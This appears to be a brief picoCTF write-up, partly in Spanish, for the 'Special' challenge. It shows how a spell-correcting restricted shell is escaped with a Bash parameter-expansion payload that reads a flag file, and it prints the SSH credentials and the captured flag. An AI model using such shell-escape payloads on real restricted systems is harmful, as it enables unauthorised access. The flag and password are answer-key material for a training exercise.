## Descripción
Don't power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized... automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That's Special (TM) Start your instance to see connection details. `ssh -p 63854 ctf-player@saturn.picoctf.net` The password is `af86add3`
## Solución
Para resolver el reto, utilicé la expansión de variables en Bash para intentar leer `blargh/flag.txt`. Aunque el comando produjo un error por la redirección (`<`), el sistema mostró la bandera
```Special$ ${parameter=cat < blargh/flag.txt}
${parameter=cat < blargh/flag.txt} 
cat: '<': No such file or directory
picoCTF{5p311ch3ck_15_7h3_w0r57_6a2763f6}Special$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.

```

## Referencias
**Bash parameter expansion**: `${variable=valor}` para asignar un valor si la variable no está definida.
